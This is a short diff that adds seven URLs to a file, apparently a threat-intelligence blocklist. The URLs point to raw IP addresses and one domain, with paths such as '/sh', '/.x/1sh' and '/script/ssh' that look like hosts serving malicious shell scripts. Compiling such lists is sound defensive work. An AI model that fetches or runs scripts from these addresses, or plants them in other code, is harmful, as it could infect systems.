@@ -1,0 +1,7 @@
+http://51.75.191.234/sh
+http://71.127.148.69/.x/1sh
+http://71.127.148.69/.x/2sh
+http://71.127.148.69/.x/3sh
+http://182.53.197.62/centaur-docs/23
+http://182.53.197.62/centaur-docs/23s
+http://dns.cyberium.cc/script/ssh
